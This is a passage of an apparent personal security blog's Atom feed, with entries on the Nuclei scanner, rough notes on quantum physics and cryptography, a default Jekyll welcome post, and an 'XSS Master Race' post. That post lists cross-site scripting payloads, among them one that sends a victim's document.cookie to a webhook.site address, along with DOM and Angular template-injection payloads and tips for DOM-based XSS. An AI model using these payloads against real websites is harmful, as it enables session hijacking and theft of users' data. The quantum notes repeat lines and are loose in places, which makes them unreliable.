&lt;p&gt;nuclei -t technologies/tech-detect.yaml -u https://denverledinosor.fr&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://prod-files-secure.s3.us-west-2.amazonaws.com/3192903a-1f17-466c-8aea-7276980cf01c/81fd73a3-e2b4-4b5e-b55e-df5be4690b75/Untitled.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;nuclei -update&lt;/p&gt;

&lt;p&gt;nuclei -ut&lt;/p&gt;</content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html">Nuclei [Veille du MISC Janv/Fev]</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/uploads/nuclei.png" /><media:content medium="image" url="http://localhost:4000/assets/uploads/nuclei.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Quantic Post</title><link href="http://localhost:4000/quantic/" rel="alternate" type="text/html" title="Quantic Post" /><published>2023-12-20T07:35:09+01:00</published><updated>2023-12-20T07:35:09+01:00</updated><id>http://localhost:4000/quantic</id><content type="html" xml:base="http://localhost:4000/quantic/">&lt;h1 id=&quot;quantic&quot;&gt;Quantic&lt;/h1&gt;

&lt;p&gt;La physique quantique est une branche fascinante de la science qui étudie le comportement des particules subatomiques et les interactions fondamentales de l’univers. Elle remet en question notre compréhension classique de la réalité et nous fait découvrir un monde étonnant où la superposition, l’interférence et l’intrication règnent en maître. La physique quantique a des applications dans de nombreux domaines, tels que l’informatique quantique, la cryptographie quantique et la médecine quantique. Elle continue de repousser les limites de notre connaissance et de nous offrir de nouvelles perspectives sur la nature de l’univers.&lt;/p&gt;

&lt;p&gt;:::&lt;/p&gt;

&lt;p&gt;Effondrement de la fonction d’onde lorsque la fonction probabiliste est non fonctionnelle&lt;/p&gt;

&lt;p&gt;Intrication quantique changement de l’état de deux particules d’un système quelle que soit la distance qui les sépare&lt;/p&gt;

&lt;p&gt;Effondrement de la fonction d’onde lorsque la fonction probabiliste est non fonctionnelle&lt;/p&gt;

&lt;p&gt;Intrication quantique changement de l’état de deux particules d’un système quelle que soit la distance qui les sépare&lt;/p&gt;

&lt;p&gt;https://fr.wikipedia.org/wiki/Cryptographie_quantique&lt;/p&gt;

&lt;p&gt;https://fr.wikipedia.org/wiki/Cryptographie_post-quantique&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://fr.wikipedia.org/wiki/Th%C3%A9orie_de_l%27information&quot;&gt;https://fr.wikipedia.org/wiki/Théorie_de_l’information&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;China’s quantum satellite clears major hurdle on way to ultrasecure communications&lt;/p&gt;

&lt;p&gt;Sycamore&lt;/p&gt;

&lt;p&gt;Protocole BB84&lt;/p&gt;</content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html">Quantic</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/uploads/logo.jpg" /><media:content medium="image" url="http://localhost:4000/assets/uploads/logo.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">XSS Master Race</title><link href="http://localhost:4000/xss/" rel="alternate" type="text/html" title="XSS Master Race" /><published>2023-10-24T08:35:09+02:00</published><updated>2023-10-24T08:35:09+02:00</updated><id>http://localhost:4000/XSS%20master%20race</id><content type="html" xml:base="http://localhost:4000/xss/">&lt;h1 id=&quot;postxss&quot;&gt;PostXSS&lt;/h1&gt;

&lt;p&gt;Hi everyone it’s Denverledinosor and welcome to this new post about XSS&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Here is a couple of Payload :&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-markdown highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Classic

javascript:alert(document.cookie)
cookie=&apos;.concat(document.cookie);//
&apos;;document.location.href=&apos;https://webhook.site/03d5790c-ca53-47be-bd66-3ceca1d48f1f/?cookie=&apos;.concat(document.cookie);//

DOM XSS

&apos; % &lt;span class=&quot;nt&quot;&gt;&amp;lt;alert&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(1)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;; //
&apos; - &lt;span class=&quot;nt&quot;&gt;&amp;lt;alert&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(1)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;; //
&apos; + &lt;span class=&quot;nt&quot;&gt;&amp;lt;alert&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(1)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;; //
&apos; / &lt;span class=&quot;nt&quot;&gt;&amp;lt;alert&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(1)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;; //
&apos; ^ &amp;lt;alert(1); //
&apos;;alert(1);&apos;

DOM XSS Angular

{{1+1}}
{{$eval.constructor(&apos;alert(1)&apos;)()}}
{{$eval(5,5)}}

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Petits conseils pour les XSS Basées sur le DOM&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Regardez le rendu de votre entrée sur le code source.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;On this type of vuln, we have the possibility of being able to visualize our actions and the repercussions they have. For example, checking that quotes have been escaped.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Look at the errors that the console displays to you
your browser.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Errors
allow you to understand many things about the code, and often in this genre
of XSS errors, that’s a good sign! This means that we managed to do
carry out things on the site that were not initially planned. Look
errors are therefore essential.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;https://0xhorizon.eu/fr/articles/xss-dom-based/&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html">PostXSS</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/uploads/xss.png" /><media:content medium="image" url="http://localhost:4000/assets/uploads/xss.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Welcome to Jekyll!</title><link href="http://localhost:4000/welcome/" rel="alternate" type="text/html" title="Welcome to Jekyll!" /><published>2023-10-18T15:06:09+02:00</published><updated>2023-10-18T15:06:09+02:00</updated><id>http://localhost:4000/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/welcome/">&lt;p&gt;You’ll find this post in your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;

&lt;p&gt;Jekyll requires blog post files to be named according to the following format:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YEAR-MONTH-DAY-title.MARKUP&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YEAR&lt;/code&gt; is a four-digit number, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MONTH&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DAY&lt;/code&gt; are both two-digit numbers, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MARKUP&lt;/code&gt; is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;

&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Tom&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints &apos;Hi, Tom&apos; to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Check out the &lt;a href=&quot;https://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.</summary></entry></feed>